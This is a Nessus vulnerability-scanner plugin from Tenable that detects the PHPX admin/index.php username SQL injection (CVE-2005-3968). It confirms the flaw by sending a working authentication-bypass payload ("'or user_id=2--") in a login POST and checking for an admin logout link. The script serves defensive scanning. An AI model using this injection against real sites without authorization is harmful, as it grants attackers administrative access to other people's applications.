#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20251);
  script_version("$Revision: 1.22 $");

  script_cve_id("CVE-2005-3968");
  script_bugtraq_id(15680);
  script_osvdb_id(21384);

  script_name(english:"PHPX admin/index.php username Parameter SQL Injection");
  script_summary(english:"Checks for username parameter SQL injection vulnerability in PHPX");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a PHP application that is affected by a SQL
injection flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHPX, a content management system written
in PHP. 

The installed version of PHPX does not validate input to the
'username' parameter of the 'admin/index.php' script before using it
in a database query.  Provided PHP's 'magic_quotes_gpc' setting is
off, an attacker can leverage this issue to manipulate SQL queries to,
for example, bypass authentication and gain administrative access to
the affected application." );
 script_set_attribute(attribute:"see_also", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/23459");
 script_set_attribute(attribute:"solution", value:
"Enable PHP's 'magic_quotes_gpc' setting." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/30");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpx:phpx");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpx", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:string(dir, "/admin/login.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("form method=post action=index.php name=f" >< res) {
    # Try to exploit the flaw to bypass authentication.
    postdata = string(
      "username='or user_id=2--&",
      "password=&",
      "login=yes"
    );
    r = http_send_recv3(method: "POST", item: dir+"/admin/index.php", port: port, 
      content_type:"application/x-www-form-urlencoded", data: postdata);
    if (isnull(r)) exit(0);
    res = strcat(r[0], r[1], '\r\n', r[2]);

    # There's a problem if we can log in.
    if ("href=index.php?action=logout>Logout</a>" >< res) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
